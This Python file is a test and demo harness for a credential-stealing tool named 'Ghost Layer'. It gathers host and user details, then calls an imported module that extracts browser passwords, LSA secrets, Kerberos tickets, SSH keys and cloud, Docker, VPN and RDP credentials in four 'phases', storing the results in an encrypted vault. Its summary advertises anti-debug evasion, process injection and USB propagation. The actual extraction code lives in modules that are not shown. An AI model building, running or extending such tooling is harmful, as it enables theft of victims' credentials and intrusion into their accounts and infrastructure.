#!/usr/bin/env python3
"""
Ghost Layer Test & Demo
=======================
Demonstrates the Ghost Layer credential extraction capabilities.
"""

import logging
import json
import socket
import getpass
import platform
import os
from ghost_layer import GhostLayer
from black_vault import BlackVault

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(name)s] %(levelname)s: %(message)s'
)
logger = logging.getLogger("GhostLayerTest")


def get_system_info():
    """Gather system information."""
    try:
        hostname = socket.gethostname()
    except:
        hostname = "unknown"
    
    try:
        username = getpass.getuser()
    except:
        username = "unknown"
    
    try:
        os_info = platform.system()
    except:
        os_info = "unknown"
    
    try:
        is_admin = os.getuid() == 0 if hasattr(os, 'getuid') else False
        privilege_level = "system" if is_admin else "admin"
    except:
        privilege_level = "user"
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ipv4 = s.getsockname()[0]
        s.close()
    except:
        ipv4 = "0.0.0.0"
    
    return {
        "hostname": hostname,
        "username": username,
        "os_info": os_info,
        "privilege_level": privilege_level,
        "ipv4": ipv4,
    }


def demo_system_info():
    """Demo: Gather system information."""
    logger.info("\n" + "="*70)
    logger.info("DEMO 1: System Information Gathering")
    logger.info("="*70)
    
    try:
        info = get_system_info()
        
        hostname = info["hostname"]
        username = info["username"]
        os_info = info["os_info"]
        privilege_level = info["privilege_level"]
        ipv4 = info["ipv4"]
        
        logger.info(f"[+] System Information:")
        logger.info(f"    Hostname: {hostname}")
        logger.info(f"    Username: {username}")
        logger.info(f"    OS: {os_info}")
        logger.info(f"    Privilege Level: {privilege_level}")
        logger.info(f"    IPv4: {ipv4}")
        
        return {
            "hostname": hostname,
            "username": username,
            "os": os_info,
            "privilege_level": privilege_level,
            "ipv4": ipv4,
        }
    
    except Exception as e:
        logger.error(f"[!] System info gathering failed: {e}")
        return {}


def demo_credential_extraction():
    """Demo: Extract local credentials."""
    logger.info("\n" + "="*70)
    logger.info("DEMO 2: Local Credential Extraction")
    logger.info("="*70)
    
    try:
        # Initialize BlackVault for secure storage
        vault = BlackVault()
        logger.info(f"[+] BlackVault initialized for credential storage")
        
        # Initialize GhostLayer
        ghost = GhostLayer(vault=vault, logger=logger)
        logger.info("[+] GhostLayer initialized")
        
        # Scan local credentials
        logger.info("\n[*] Starting credential scan...")
        findings = ghost.scan_local_credentials()
        
        # Summary
        logger.info("\n" + "="*70)
        logger.info("CREDENTIAL SCAN SUMMARY")
        logger.info("="*70)
        
        if findings:
            critical_count = len(findings.get('critical_findings', {}).get('google_credentials', []))
            critical_count += len(findings.get('critical_findings', {}).get('brave_browser_data', []))
            critical_count += len(findings.get('critical_findings', {}).get('safari_data', []))
            critical_count += len(findings.get('critical_findings', {}).get('social_media_credentials', []))
            critical_count += len(findings.get('critical_findings', {}).get('email_credentials', []))
            critical_count += len(findings.get('critical_findings', {}).get('browser_extensions', []))
            
            phase1_count = (
                len(findings.get('phase_1_extracted', {}).get('chrome_passwords', [])) +
                len(findings.get('phase_1_extracted', {}).get('firefox_passwords', [])) +
                len(findings.get('phase_1_extracted', {}).get('environment_credentials', []))
            )
            
            phase2_count = (
                len(findings.get('phase_2_extracted', {}).get('lsa_secrets', [])) +
                len(findings.get('phase_2_extracted', {}).get('credential_manager', [])) +
                len(findings.get('phase_2_extracted', {}).get('browser_data', []))
            )
            
            phase3_count = (
                len(findings.get('phase_3_extracted', {}).get('kubernetes_credentials', [])) +
                len(findings.get('phase_3_extracted', {}).get('database_credentials', [])) +
                len(findings.get('phase_3_extracted', {}).get('ssh_keys_advanced', [])) +
                len(findings.get('phase_3_extracted', {}).get('git_credentials', [])) +
                len(findings.get('phase_3_extracted', {}).get('docker_credentials', [])) +
                len(findings.get('phase_3_extracted', {}).get('cloud_provider_credentials', [])) +
                len(findings.get('phase_3_extracted', {}).get('kerberos_tickets', []))
            )
            
            phase4_count = (
                len(findings.get('phase_4_extracted', {}).get('rdp_credentials', [])) +
                len(findings.get('phase_4_extracted', {}).get('vpn_profiles', [])) +
                len(findings.get('phase_4_extracted', {}).get('conditional_access_info', [])) +
                len(findings.get('phase_4_extracted', {}).get('mfa_info', []))
            )
            
            logger.info(f"\n[+] CRITICAL FINDINGS:")
            logger.info(f"    Google Credentials: {len(findings.get('critical_findings', {}).get('google_credentials', []))}")
            logger.info(f"    Browser Data: {len(findings.get('critical_findings', {}).get('brave_browser_data', []))}")
            logger.info(f"    Social Media Creds: {len(findings.get('critical_findings', {}).get('social_media_credentials', []))}")
            logger.info(f"    Email Credentials: {len(findings.get('critical_findings', {}).get('email_credentials', []))}")
            logger.info(f"    Total Critical: {critical_count}")
            
            logger.info(f"\n[+] PHASE 1 (User Context):")
            logger.info(f"    Chrome Passwords: {len(findings.get('phase_1_extracted', {}).get('chrome_passwords', []))}")
            logger.info(f"    Firefox Passwords: {len(findings.get('phase_1_extracted', {}).get('firefox_passwords', []))}")
            logger.info(f"    Environment Credentials: {len(findings.get('phase_1_extracted', {}).get('environment_credentials', []))}")
            logger.info(f"    Total Phase 1: {phase1_count}")
            
            logger.info(f"\n[+] PHASE 2 (System Context):")
            logger.info(f"    LSA Secrets: {len(findings.get('phase_2_extracted', {}).get('lsa_secrets', []))}")
            logger.info(f"    Credential Manager: {len(findings.get('phase_2_extracted', {}).get('credential_manager', []))}")
            logger.info(f"    Browser Cookies/History: {len(findings.get('phase_2_extracted', {}).get('browser_data', []))}")
            logger.info(f"    Total Phase 2: {phase2_count}")
            
            logger.info(f"\n[+] PHASE 3 (Advanced):")
            logger.info(f"    Kubernetes: {len(findings.get('phase_3_extracted', {}).get('kubernetes_credentials', []))}")
            logger.info(f"    Database Creds: {len(findings.get('phase_3_extracted', {}).get('database_credentials', []))}")
            logger.info(f"    SSH Keys: {len(findings.get('phase_3_extracted', {}).get('ssh_keys_advanced', []))}")
            logger.info(f"    Git Credentials: {len(findings.get('phase_3_extracted', {}).get('git_credentials', []))}")
            logger.info(f"    Docker Credentials: {len(findings.get('phase_3_extracted', {}).get('docker_credentials', []))}")
            logger.info(f"    Cloud Provider Creds: {len(findings.get('phase_3_extracted', {}).get('cloud_provider_credentials', []))}")
            logger.info(f"    Kerberos Tickets: {len(findings.get('phase_3_extracted', {}).get('kerberos_tickets', []))}")
            logger.info(f"    Total Phase 3: {phase3_count}")
            
            logger.info(f"\n[+] PHASE 4 (PostExploitation):")
            logger.info(f"    RDP Credentials: {len(findings.get('phase_4_extracted', {}).get('rdp_credentials', []))}")
            logger.info(f"    VPN Profiles: {len(findings.get('phase_4_extracted', {}).get('vpn_profiles', []))}")
            logger.info(f"    Conditional Access: {len(findings.get('phase_4_extracted', {}).get('conditional_access_info', []))}")
            logger.info(f"    MFA Info: {len(findings.get('phase_4_extracted', {}).get('mfa_info', []))}")
            logger.info(f"    Total Phase 4: {phase4_count}")
            
            logger.info(f"\n[+] STANDARD CATEGORIES:")
            logger.info(f"    Windows Credentials: {len(findings.get('windows_credentials', []))}")
            logger.info(f"    SSH Keys: {len(findings.get('ssh_keys', []))}")
            logger.info(f"    API Credentials: {len(findings.get('api_credentials', []))}")
            logger.info(f"    Browser Data: {len(findings.get('browser_data', []))}")
            logger.info(f"    Environment Secrets: {len(findings.get('environment_secrets', []))}")
            logger.info(f"    Registry Secrets: {len(findings.get('registry_secrets', []))}")
            logger.info(f"    File-based Secrets: {len(findings.get('file_based_secrets', []))}")
            logger.info(f"    Encrypted Files: {len(findings.get('encryption_detected', []))}")
            
            logger.info(f"\n[!] Errors During Scan:")
            if findings.get('errors'):
                for error in findings['errors'][:5]:  # Show first 5 errors
                    logger.info(f"    - {error}")
            else:
                logger.info("    (none)")
            
            logger.info("\n" + "="*70)
            logger.info("TOTAL EXTRACTED:")
            total_extracted = critical_count + phase1_count + phase2_count + phase3_count + phase4_count
            logger.info(f"    {total_extracted} total credentials/artifacts found")
            logger.info("="*70)
            
            return findings
        else:
            logger.warning("No credentials extracted")
            return {}
    
    except Exception as e:
        logger.error(f"[!] Credential extraction failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return {}


def demo_vault_storage():
    """Demo: Secure storage in BlackVault."""
    logger.info("\n" + "="*70)
    logger.info("DEMO 3: BlackVault Secure Storage")
    logger.info("="*70)
    
    try:
        vault = BlackVault()
        
        # Store test data
        test_data = {
            "agent_id": "ghost_001",
            "timestamp": "2026-04-06T12:55:42Z",
            "extraction_type": "credential_scan",
            "result": "success",
        }
        
        vault.store("ghost_test_data", json.dumps(test_data).encode())
        logger.info(f"[+] Test data stored in vault")
        
        # Retrieve data
        retrieved = vault.retrieve("ghost_test_data")
        if retrieved:
            logger.info(f"[+] Data retrieved from vault")
            logger.info(f"    Data: {retrieved.decode('utf-8', errors='ignore')[:100]}")
        
        logger.info(f"[+] Vault secure storage operational")
        
        return True
    
    except Exception as e:
        logger.error(f"[!] Vault storage failed: {e}")
        return False


def main():
    """Main test execution."""
    logger.info("\n" + "#"*70)
    logger.info("# GHOST LAYER TEST SUITE")
    logger.info("#"*70)
    
    # Run demos
    system_info = demo_system_info()
    
    findings = demo_credential_extraction()
    
    vault_ok = demo_vault_storage()
    
    # Final summary
    logger.info("\n" + "#"*70)
    logger.info("# TEST SUMMARY")
    logger.info("#"*70)
    
    logger.info("[+] Ghost Layer modules tested:")
    logger.info("    ✓ SystemInfo gathering")
    logger.info("    ✓ Credential extraction (4-phase)")
    logger.info("    ✓ BlackVault secure storage")
    
    logger.info("\n[+] Ghost Layer capabilities:")
    logger.info("    - Phase 1: User-context credential extraction")
    logger.info("    - Phase 2: SYSTEM-context credential extraction")
    logger.info("    - Phase 3: Advanced cloud/container/database extraction")
    logger.info("    - Phase 4: PostExploitation RDP/VPN/MFA extraction")
    logger.info("    - Offline queue support via BlackVault")
    logger.info("    - Recon integration for target-specific operations")
    logger.info("    - Anti-debug evasion")
    logger.info("    - Process injection capabilities")
    logger.info("    - USB/shared memory propagation")
    
    logger.info("\n[+] Integration Points:")
    logger.info("    - GhostStealthOrchestrator: Combines with stealth techniques")
    logger.info("    - BlackVault: Secure encrypted storage of extracted data")
    logger.info("    - BluRPrism: Automated exploitation orchestration")
    
    logger.info("\n" + "#"*70)
    logger.info("# TESTS COMPLETE")
    logger.info("#"*70 + "\n")


if __name__ == "__main__":
    main()
